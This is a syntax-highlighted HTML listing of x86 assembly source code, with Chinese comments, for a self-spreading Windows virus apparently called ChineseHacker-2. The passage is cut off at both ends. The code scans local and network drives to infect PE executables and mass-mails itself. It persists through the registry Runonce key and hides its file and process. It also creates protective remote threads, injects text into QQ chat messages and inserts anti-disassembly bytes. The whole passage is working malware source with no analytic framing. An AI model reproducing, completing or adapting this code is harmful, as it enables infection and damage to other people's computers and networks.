    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;意外继续执行地址</span><span class="sc0">
</span><span class="sc5">StartScan</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushScanErrorProc</span><span class="sc1">;搜索本地与远程目录文件</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;恢复函数调用列表指针</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">1000</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc1">;*10</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StartScan</span><span class="sc0"> </span><span class="sc1">;休眠10分钟重新搜索文件</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushScanErrorProc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">

</span><span class="sc5">ScanExeFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundFileCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptExeFile</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundFileCallBackAddr</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到文件的处理程序</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptLocalDir</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundDirCallBackAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到目录的处理程序</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumLogDrive</span><span class="sc0">    </span><span class="sc1">;搜索本地文件，并传染病毒</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptNetDir</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundDirCallBackAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到NET目录的处理程序</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetResource</span><span class="sc0"> </span><span class="sc1">;搜索远程文件，并传染病毒   </span><span class="sc0">

</span><span class="sc5">ScanMailFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundFileCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptMailFile</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundFileCallBackAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到文件的处理程序</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptLocalDir</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundDirCallBackAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到目录的处理程序</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumLogDrive</span><span class="sc0">    </span><span class="sc1">;搜索本地文件，发邮件</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OptNetDir</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FoundDirCallBackAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;设置找到NET目录的处理程序</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetResource</span><span class="sc0"> </span><span class="sc1">;搜索远程文件，发邮件</span><span class="sc0">

</span><span class="sc5">CheckRemoteAndWait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.DataRemoteThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWaitForSingleObject</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;睡眠8小时</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AddWordToQQMsg</span><span class="sc0">
</span><span class="sc5">NeedCreateRemote</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWaitErrorProc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetNetSendMsg</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Net Send * My god! Some one killed ChineseHacker-2 Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetNetSendMsg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWinExec</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CheckRemoteAndWait</span><span class="sc0">
</span><span class="sc5">PushWaitErrorProc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ProcessProtect</span><span class="sc0">  </span><span class="sc1">;重新启动远程线程保护/内带意外</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">AddWordToQQMsg</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc0">
</span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.UserFindWindowA</span><span class="sc4">]</span><span class="sc1">;填写线程用API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindWindowA9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.UserGetWindow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetWindow9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.UserSendMessageA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SendMessageA9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Sleep9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SendQQMsg</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInRegEdi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;创建QQ附加消息线程</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCreateThread</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;保证SendQQMsg线程活动10分钟</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CheckRemoteAndWaitAgain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.DataRemoteThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWaitForSingleObject</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;睡眠10分钟</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlTerminateThread</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NeedCreateRemoteAgain</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc1">;      ;人工意外，继续搜索文件</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">NeedCreateRemoteAgain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWaitErrorProcAgain</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CheckRemoteAndWaitAgain</span><span class="sc0">
</span><span class="sc5">PushWaitErrorProcAgain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ProcessProtect</span><span class="sc0">  </span><span class="sc1">;重新启动远程线程保护/内带意外</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushNextRunErrorProc</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;保护注册表与创建远程线程</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">

</span><span class="sc5">RegisterProtect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">;构造病毒路径</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildVirusPathInStack</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLCreat</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1h</span><span class="sc0">     </span><span class="sc1">;创建独占文件</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OptRegister</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnzipVirusToFile</span><span class="sc1">;解压PE文件</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixPeFile</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;传染病毒给PE文件,不关闭文件，防删除</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;把病毒设置为：隐藏+系统+只读</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetFileAttributesA</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    
</span><span class="sc5">OptRegister</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushRegKeyStr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushRegKeyStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.AdvRegOpenKeyA</span><span class="sc4">],</span><span class="sc2">080000002h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKeyNameStr</span><span class="sc0">  </span><span class="sc1">;修改注册表，自动Run项目</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Runonce'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKeyNameStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.AdvRegSetValueExA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVirusBaseInEdi</span><span class="sc0">   
</span><span class="sc5">GetVirusBaseInEdi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;得到病毒位置参照偏移量</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.AdvRegQueryValueExA</span><span class="sc4">]</span><span class="sc1">;填写API地址</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AdvRegQueryValueExA9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.AdvRegSetValueExA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AdvRegSetValueExA9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.AdvRegNotifyChange</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AdvRegNotifyChangeKeyValue9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegisterProtectProc</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdi</span><span class="sc4">]</span><span class="sc0">       
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;创建注册表监视线程</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCreateThread</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;不关闭注册表句柄，监视线程续用</span><span class="sc0">

</span><span class="sc5">ProcessProtect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;创建远程线程</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.DataRemoteThread</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildVirusPathInStack</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc0">
</span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;得到病毒位置参照偏移量</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.KnlOpenProcess</span><span class="sc4">]</span><span class="sc1">;填写API地址</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KnlOpenProcess9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.KnlWaitForSingleObject</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KnlWaitForSingleObject9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.KnlWinExec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KnlWinExec9x2k</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.KnlRegisterServiceProc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;依靠函数RehSvrProc来假定操作系统类别9x/2k</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Process2kProtect</span><span class="sc0">  

</span><span class="sc5">Process9xProtect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;在Win9x下先隐藏本进程，一级保护</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.DataKnlMzHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">edx.PEHeaderOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.fhObjectTable00.otRVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">ebx.fhHeaderSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Process9xProtectEnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;查询Knl空间</span><span class="sc0">

